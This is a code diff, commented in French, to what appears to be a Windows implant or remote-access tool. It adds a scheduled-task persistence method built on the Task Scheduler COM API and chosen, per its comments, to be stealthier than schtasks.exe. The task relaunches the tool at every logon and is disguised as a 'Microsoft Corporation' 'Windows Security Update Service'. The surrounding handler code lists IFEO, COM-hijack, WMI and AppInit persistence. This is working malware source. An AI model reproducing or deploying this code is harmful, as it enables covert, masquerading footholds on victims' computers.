@@ -387,6 +387,213 @@ static int persist_ifeo_remove(const char* target_exe) {
          ? STATUS_SUCCESS : STATUS_FAILURE;
 }
 
+/* =========================================================================
+ * Scheduled Task via COM API
+ * Plus discret que schtasks.exe en ligne de commande
+ * ========================================================================= */
+
+#include <taskschd.h>
+#pragma comment(lib, "taskschd.lib")
+
+/* GUIDs pour Task Scheduler */
+DEFINE_GUID(CLSID_TaskScheduler_Local, 0x0f87369f, 0xa4e5, 0x4cfc, 
+            0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd);
+DEFINE_GUID(IID_ITaskService_Local, 0x2faba4c7, 0x4da9, 0x4013, 
+            0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85);
+
+/*
+ * Crée une tâche planifiée via l'API COM Task Scheduler
+ * Plus furtif que l'utilisation de schtasks.exe
+ */
+static int persist_schtask_com_add(void) {
+  char exe_path[MAX_PATH_LEN];
+  if (!get_current_exe_path(exe_path, sizeof(exe_path))) {
+    return STATUS_FAILURE;
+  }
+  
+  HRESULT hr;
+  ITaskService *pService = NULL;
+  ITaskFolder *pRootFolder = NULL;
+  ITaskDefinition *pTask = NULL;
+  IRegistrationInfo *pRegInfo = NULL;
+  ITriggerCollection *pTriggerCollection = NULL;
+  ITrigger *pTrigger = NULL;
+  ILogonTrigger *pLogonTrigger = NULL;
+  IActionCollection *pActionCollection = NULL;
+  IAction *pAction = NULL;
+  IExecAction *pExecAction = NULL;
+  IRegisteredTask *pRegisteredTask = NULL;
+  
+  int result = STATUS_FAILURE;
+  
+  /* Initialise COM */
+  hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+  if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
+    return STATUS_FAILURE;
+  }
+  
+  /* Crée l'instance du Task Service */
+  hr = CoCreateInstance(&CLSID_TaskScheduler_Local, NULL, CLSCTX_INPROC_SERVER,
+                        &IID_ITaskService_Local, (void**)&pService);
+  if (FAILED(hr)) goto cleanup;
+  
+  /* Connexion au service */
+  hr = pService->lpVtbl->Connect(pService, 
+                                  (VARIANT){0}, (VARIANT){0}, 
+                                  (VARIANT){0}, (VARIANT){0});
+  if (FAILED(hr)) goto cleanup;
+  
+  /* Récupère le dossier root */
+  BSTR rootPath = SysAllocString(L"\\");
+  hr = pService->lpVtbl->GetFolder(pService, rootPath, &pRootFolder);
+  SysFreeString(rootPath);
+  if (FAILED(hr)) goto cleanup;
+  
+  /* Crée une nouvelle définition de tâche */
+  hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
+  if (FAILED(hr)) goto cleanup;
+  
+  /* Configure les infos d'enregistrement */
+  hr = pTask->lpVtbl->get_RegistrationInfo(pTask, &pRegInfo);
+  if (SUCCEEDED(hr)) {
+    BSTR author = SysAllocString(L"Microsoft Corporation");
+    pRegInfo->lpVtbl->put_Author(pRegInfo, author);
+    SysFreeString(author);
+    
+    BSTR description = SysAllocString(L"Windows Security Update Service");
+    pRegInfo->lpVtbl->put_Description(pRegInfo, description);
+    SysFreeString(description);
+    
+    pRegInfo->lpVtbl->Release(pRegInfo);
+  }
+  
+  /* Ajoute un trigger au logon */
+  hr = pTask->lpVtbl->get_Triggers(pTask, &pTriggerCollection);
+  if (FAILED(hr)) goto cleanup;
+  
+  hr = pTriggerCollection->lpVtbl->Create(pTriggerCollection, TASK_TRIGGER_LOGON, &pTrigger);
+  if (FAILED(hr)) goto cleanup;
+  
+  hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &IID_ILogonTrigger, (void**)&pLogonTrigger);
+  if (SUCCEEDED(hr)) {
+    BSTR triggerId = SysAllocString(L"LogonTriggerId");
+    pLogonTrigger->lpVtbl->put_Id(pLogonTrigger, triggerId);
+    SysFreeString(triggerId);
+    
+    /* Delay de 30 secondes après le logon */
+    BSTR delay = SysAllocString(L"PT30S");
+    pLogonTrigger->lpVtbl->put_Delay(pLogonTrigger, delay);
+    SysFreeString(delay);
+    
+    pLogonTrigger->lpVtbl->Release(pLogonTrigger);
+  }
+  
+  /* Ajoute l'action (exécuter notre exe) */
+  hr = pTask->lpVtbl->get_Actions(pTask, &pActionCollection);
+  if (FAILED(hr)) goto cleanup;
+  
+  hr = pActionCollection->lpVtbl->Create(pActionCollection, TASK_ACTION_EXEC, &pAction);
+  if (FAILED(hr)) goto cleanup;
+  
+  hr = pAction->lpVtbl->QueryInterface(pAction, &IID_IExecAction, (void**)&pExecAction);
+  if (FAILED(hr)) goto cleanup;
+  
+  /* Convertit le chemin en wide string */
+  WCHAR wExePath[MAX_PATH_LEN];
+  MultiByteToWideChar(CP_ACP, 0, exe_path, -1, wExePath, MAX_PATH_LEN);
+  
+  BSTR exePath = SysAllocString(wExePath);
+  hr = pExecAction->lpVtbl->put_Path(pExecAction, exePath);
+  SysFreeString(exePath);
+  if (FAILED(hr)) goto cleanup;
+  
+  /* Enregistre la tâche */
+  WCHAR wTaskName[256];
+  MultiByteToWideChar(CP_ACP, 0, PERSIST_NAME, -1, wTaskName, 256);
+  
+  BSTR taskName = SysAllocString(wTaskName);
+  hr = pRootFolder->lpVtbl->RegisterTaskDefinition(
+    pRootFolder,
+    taskName,
+    pTask,
+    TASK_CREATE_OR_UPDATE,
+    (VARIANT){0},  /* User */
+    (VARIANT){0},  /* Password */
+    TASK_LOGON_INTERACTIVE_TOKEN,
+    (VARIANT){0},  /* sddl */
+    &pRegisteredTask
+  );
+  SysFreeString(taskName);
+  
+  if (SUCCEEDED(hr)) {
+    result = STATUS_SUCCESS;
+  }
+  
+cleanup:
+  if (pRegisteredTask) pRegisteredTask->lpVtbl->Release(pRegisteredTask);
+  if (pExecAction) pExecAction->lpVtbl->Release(pExecAction);
+  if (pAction) pAction->lpVtbl->Release(pAction);
+  if (pActionCollection) pActionCollection->lpVtbl->Release(pActionCollection);
+  if (pTrigger) pTrigger->lpVtbl->Release(pTrigger);
+  if (pTriggerCollection) pTriggerCollection->lpVtbl->Release(pTriggerCollection);
+  if (pTask) pTask->lpVtbl->Release(pTask);
+  if (pRootFolder) pRootFolder->lpVtbl->Release(pRootFolder);
+  if (pService) pService->lpVtbl->Release(pService);
+  
+  CoUninitialize();
+  
+  return result;
+}
+
+/*
+ * Supprime la tâche planifiée via COM API
+ */
+static int persist_schtask_com_remove(void) {
+  HRESULT hr;
+  ITaskService *pService = NULL;
+  ITaskFolder *pRootFolder = NULL;
+  
+  int result = STATUS_FAILURE;
+  
+  hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+  if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
+    return STATUS_FAILURE;
+  }
+  
+  hr = CoCreateInstance(&CLSID_TaskScheduler_Local, NULL, CLSCTX_INPROC_SERVER,
+                        &IID_ITaskService_Local, (void**)&pService);
+  if (FAILED(hr)) goto cleanup;
+  
+  hr = pService->lpVtbl->Connect(pService, 
+                                  (VARIANT){0}, (VARIANT){0}, 
+                                  (VARIANT){0}, (VARIANT){0});
+  if (FAILED(hr)) goto cleanup;
+  
+  BSTR rootPath = SysAllocString(L"\\");
+  hr = pService->lpVtbl->GetFolder(pService, rootPath, &pRootFolder);
+  SysFreeString(rootPath);
+  if (FAILED(hr)) goto cleanup;
+  
+  WCHAR wTaskName[256];
+  MultiByteToWideChar(CP_ACP, 0, PERSIST_NAME, -1, wTaskName, 256);
+  
+  BSTR taskName = SysAllocString(wTaskName);
+  hr = pRootFolder->lpVtbl->DeleteTask(pRootFolder, taskName, 0);
+  SysFreeString(taskName);
+  
+  if (SUCCEEDED(hr) || hr == HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND)) {
+    result = STATUS_SUCCESS;
+  }
+  
+cleanup:
+  if (pRootFolder) pRootFolder->lpVtbl->Release(pRootFolder);
+  if (pService) pService->lpVtbl->Release(pService);
+  
+  CoUninitialize();
+  
+  return result;
+}
+
 int handler_persist_add(const char *type) {
   if (!type) {
     /* Par défaut: registry */
@@ -397,6 +604,8 @@ int handler_persist_add(const char *type) {
     return persist_registry_add();
   } else if (str_icmp(type, "schtask") == 0 || str_icmp(type, "task") == 0) {
     return persist_schtask_add();
+  } else if (str_icmp(type, "schtaskcom") == 0 || str_icmp(type, "taskcom") == 0) {
+    return persist_schtask_com_add();
   } else if (str_icmp(type, "com") == 0 || str_icmp(type, "comhijack") == 0) {
     return persist_com_hijack_add();
   } else if (str_icmp(type, "wmi") == 0) {
@@ -408,7 +617,7 @@ int handler_persist_add(const char *type) {
   } else if (str_icmp(type, "all") == 0) {
     /* Toutes les méthodes non-admin */
     int r1 = persist_registry_add();
-    int r2 = persist_schtask_add();
+    int r2 = persist_schtask_com_add();
     int r3 = persist_com_hijack_add();
     return (r1 == STATUS_SUCCESS || r2 == STATUS_SUCCESS || r3 == STATUS_SUCCESS) 
            ? STATUS_SUCCESS : STATUS_FAILURE;
@@ -428,6 +637,7 @@ int handler_persist_remove(const char *type) {
   if (!type || str_icmp(type, "all") == 0) {
     persist_registry_remove();
     persist_schtask_remove();
+    persist_schtask_com_remove();
     persist_com_hijack_remove();
     persist_wmi_remove();
     persist_appinit_remove();
@@ -439,6 +649,8 @@ int handler_persist_remove(const char *type) {
     return persist_registry_remove();
   } else if (str_icmp(type, "schtask") == 0 || str_icmp(type, "task") == 0) {
     return persist_schtask_remove();
+  } else if (str_icmp(type, "schtaskcom") == 0 || str_icmp(type, "taskcom") == 0) {
+    return persist_schtask_com_remove();
   } else if (str_icmp(type, "com") == 0 || str_icmp(type, "comhijack") == 0) {
     return persist_com_hijack_remove();
   } else if (str_icmp(type, "wmi") == 0) {
